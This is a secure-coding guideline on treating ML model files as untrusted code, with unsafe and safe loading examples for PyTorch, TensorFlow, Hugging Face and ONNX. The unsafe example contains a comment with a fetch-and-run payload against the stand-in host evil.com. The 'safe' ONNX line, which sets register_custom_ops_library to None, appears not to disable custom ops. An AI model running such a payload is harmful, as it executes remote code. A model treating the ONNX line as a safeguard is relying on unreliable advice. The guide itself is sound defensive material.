---
title: Treat ML Model Files as Untrusted Code — Validate Format and Source
impact: MEDIUM
impactDescription: Malicious model files achieve arbitrary code execution through pickle deserialization
tags: ml-security, model-loading, pickle, safetensors, pytorch, tensorflow, onnx
---

## Treat ML Model Files as Untrusted Code — Validate Format and Source

ML model files are deserialization attacks waiting to happen. PyTorch `.pt`/`.pth` files use pickle serialization — loading an untrusted model executes arbitrary code. TensorFlow SavedModel can contain custom ops. ONNX models can load native libraries through custom operators. Pre-trained model registries (Hugging Face, PyTorch Hub) are targets for malicious uploads.

**Incorrect (loading untrusted models with unsafe defaults):**

```python
import torch
import tensorflow as tf
from transformers import pipeline

# PyTorch: torch.load uses pickle — arbitrary code execution
model = torch.load("downloaded_model.pt")
# Attacker crafted pickle payload executes: os.system("curl evil.com | sh")

# TensorFlow: SavedModel can contain malicious ops
model = tf.saved_model.load("untrusted_saved_model/")

# Hugging Face: trust_remote_code downloads and runs arbitrary Python
classifier = pipeline("sentiment-analysis",
    model="unknown-user/model",
    trust_remote_code=True  # Executes model's custom Python code
)

# ONNX: custom ops can load native shared libraries
import onnxruntime
sess = onnxruntime.InferenceSession("model_with_custom_ops.onnx")
```

**Correct (safe formats, verified sources, restricted loading):**

```python
import torch
from safetensors.torch import load_file, save_file
from transformers import AutoModel

# SafeTensors: purpose-built safe format — only tensor data, no code
state_dict = load_file("model.safetensors")
model = MyModel()
model.load_state_dict(state_dict)

# PyTorch 2.6+: weights_only restricts to safe tensor operations
state_dict = torch.load("model.pt", weights_only=True)

# Hugging Face: only use verified models, never trust remote code
model = AutoModel.from_pretrained(
    "verified-org/audited-model",
    trust_remote_code=False,  # Reject custom code
    revision="abc123def",     # Pin to specific commit hash
)

# ONNX: disable custom ops, validate model structure
import onnxruntime
options = onnxruntime.SessionOptions()
options.register_custom_ops_library = None  # No custom native ops
sess = onnxruntime.InferenceSession("model.onnx", sess_options=options)
```

Convert existing pickle-based models to SafeTensors format for safe distribution. In shared GPU environments, inter-process GPU memory leaks can expose data from other users. Jupyter notebooks with hidden code in metadata or auto-run cells are another vector — review notebook JSON structure, not just visible cells.
